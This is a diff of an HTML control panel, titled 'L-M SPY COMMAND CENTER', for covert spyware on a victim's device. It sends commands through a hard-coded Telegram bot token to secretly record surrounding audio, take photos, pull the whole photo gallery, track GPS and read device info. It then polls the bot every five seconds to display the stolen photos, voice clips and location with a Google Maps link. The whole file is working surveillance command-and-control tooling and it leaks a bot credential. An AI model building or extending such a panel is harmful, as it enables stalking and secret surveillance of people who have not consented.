@@ -3,113 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>L-M SPY COMMAND CENTER</title>
+    <title>L-M ADVANCED CONTROL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* Matrix/Hacker Style CSS */
-        body {
-            background-color: #0a0a0a;
-            color: #00ff41;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        .dashboard {
-            border: 2px solid #00ff41;
-            padding: 30px;
-            background: rgba(0, 50, 0, 0.1);
-            box-shadow: 0 0 20px #00ff41;
-            text-align: center;
-            width: 350px;
-        }
-
-        h1 {
-            font-size: 22px;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px #00ff41;
-        }
-
-        .status-box {
-            border: 1px solid #00ff41;
-            padding: 10px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            background: #000;
-        }
-
-        .btn {
-            background: transparent;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 12px;
-            margin: 10px 0;
-            width: 100%;
-            cursor: pointer;
-            font-size: 16px;
-            text-transform: uppercase;
-            transition: 0.3s;
-        }
-
-        .btn:hover {
-            background: #00ff41;
-            color: #000;
-            box-shadow: 0 0 15px #00ff41;
-        }
-
-        #log {
-            font-size: 12px;
-            margin-top: 20px;
-            color: #aaa;
-            height: 50px;
-            overflow-y: auto;
-        }
+        body { background-color: #050505; color: #00ff41; font-family: 'Orbitron', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .dashboard { border: 2px solid #00ff41; padding: 20px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 20px #00ff41; border-radius: 15px; width: 90%; max-width: 800px; text-align: center; }
+        h1 { text-shadow: 0 0 10px #00ff41; font-size: 20px; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .btn { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 12px; cursor: pointer; font-size: 14px; border-radius: 5px; transition: 0.3s; }
+        .btn:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px #00ff41; }
+        .gallery-title { margin-top: 30px; border-bottom: 1px solid #00ff41; width: 100%; padding-bottom: 5px; text-align: center; }
+        #image-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; margin-top: 20px; width: 100%; max-width: 800px; }
+        .img-card { border: 1px solid #333; border-radius: 8px; overflow: hidden; background: #000; }
+        .img-card img { width: 100%; height: 150px; object-fit: cover; }
+        #log { font-size: 12px; color: #888; margin-top: 15px; }
+        .status-container { width: 100%; max-width: 800px; margin-top: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .status-box { border: 1px solid #00ff41; padding: 15px; background: rgba(0,20,0,0.8); border-radius: 10px; min-height: 100px; }
     </style>
 </head>
 <body>
 
 <div class="dashboard">
-    <h1>[ L-M CONTROL PANEL ]</h1>
-    
-    <div class="status-box">
-        SYSTEM: <span id="sys-status">STABLE</span><br>
-        TARGET: <span style="color: red;">CONNECTED</span>
+    <h1>[ L-M SPY COMMAND CENTER ]</h1>
+    <div class="controls">
+        <button class="btn" style="border-color: #ff9900; color: #ff9900;" onclick="sendCommand('VOICE')">🎙️ LISTEN SURROUNDING</button>
+        <button class="btn" onclick="sendCommand('PHOTO')">📸 CAPTURE PHOTO</button>
+        <button class="btn" onclick="sendCommand('GALLERY')">📁 GET ALL PHOTOS</button>
+        <button class="btn" onclick="sendCommand('LOCATION')">📍 TRACK GPS</button>
+        <button class="btn" onclick="sendCommand('INFO')">🔍 DEVICE INFO</button>
     </div>
-
-    <button class="btn" onclick="sendCommand('PHOTO')">📸 Capture Secret Photo</button>
-    <button class="btn" onclick="sendCommand('LOCATION')">📍 Track GPS Location</button>
-    <button class="btn" onclick="sendCommand('INFO')">🔍 Device System Info</button>
-
-    <div id="log">> Waiting for command...</div>
+    <p id="log">> System Ready...</p>
 </div>
 
+<div class="status-container">
+    <div class="status-box">
+        <h3 style="font-size: 14px; margin-top: 0;">📍 LIVE LOCATION</h3>
+        <p id="loc-data" style="font-size: 12px; color: #888;">Waiting for GPS...</p>
+        <a id="map-link" href="#" target="_blank" style="color: cyan; font-size: 12px; display: none;">Open in Google Maps</a>
+    </div>
+    <div class="status-box">
+        <h3 style="font-size: 14px; margin-top: 0;">🔍 SYSTEM STATUS</h3>
+        <pre id="info-text" style="font-size: 11px; white-space: pre-wrap; margin: 0; color: #00ff41;">> Waiting for stats...</pre>
+    </div>
+</div>
+
+<div style="width: 100%; max-width: 800px; margin-top: 20px;">
+    <p style="font-size: 12px; color: #ff9900;">LATEST VOICE CLIP:</p>
+    <audio id="audio-player" controls style="width: 100%; filter: invert(1); hue-rotate: 180deg;"></audio>
+</div>
+
+<h2 class="gallery-title">REAL-TIME MONITORING</h2>
+<div id="image-grid"></div>
+
 <script>
-    // ඔයාගේ Telegram තොරතුරු
     const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
     const CHAT_ID = '7883989086';
 
     async function sendCommand(type) {
-        const log = document.getElementById('log');
-        log.innerText = `> Executing ${type} command...`;
-        
-        // Telegram Bot හරහා විධානය යැවීම
-        const message = `CMD_${type}`;
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-
-        try {
-            const response = await fetch(url);
-            if (response.ok) {
-                log.innerText = `> ${type} command sent to device.`;
-            } else {
-                log.innerText = `> Error sending command!`;
-            }
-        } catch (error) {
-            log.innerText = `> Connection failed.`;
-        }
+        document.getElementById('log').innerText = `> Executing ${type}...`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=CMD_${type}`);
+        document.getElementById('log').innerText = `> ${type} command sent!`;
     }
+
+    async function updateMonitor() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-10`);
+            const data = await res.json();
+            const grid = document.getElementById('image-grid');
+            let photoHtml = '';
+
+            data.result.forEach(update => {
+                const msg = update.message;
+                if (!msg) return;
+
+                // 1. කියවීම - Photo
+                if (msg.photo) {
+                    const fileId = msg.photo[msg.photo.length - 1].file_id;
+                    photoHtml += `<div class="img-card"><img src="https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}" alt="loading..."></div>`;
+                }
+
+                // 2. කියවීම - Voice
+                if (msg.voice) {
+                    const fileId = msg.voice.file_id;
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`)
+                        .then(r => r.json())
+                        .then(f => {
+                            document.getElementById('audio-player').src = `https://api.telegram.org/file/bot${BOT_TOKEN}/${f.result.file_path}`;
+                        });
+                }
+
+                // 3. කියවීම - Text (GPS & Info)
+                if (msg.text) {
+                    let txt = msg.text;
+                    if (txt.includes("LAT:") || txt.includes("Location:")) {
+                        document.getElementById('loc-data').innerText = txt;
+                        let coords = txt.match(/-?\d+\.\d+/g);
+                        if (coords && coords.length >= 2) {
+                            document.getElementById('map-link').href = `https://www.google.com/maps?q=${coords[0]},${coords[1]}`;
+                            document.getElementById('map-link').style.display = "block";
+                        }
+                    }
+                    if (txt.includes("Battery:") || txt.includes("Model:") || txt.includes("System Info")) {
+                        document.getElementById('info-text').innerText = txt;
+                    }
+                }
+            });
+
+            if(photoHtml) grid.innerHTML = photoHtml;
+
+        } catch (e) { console.log("Update error", e); }
+    }
+
+    setInterval(updateMonitor, 5000); // තත්පර 5කට වතාවක් අප්ඩේට් වෙනවා
+    updateMonitor();
 </script>
 
 </body>
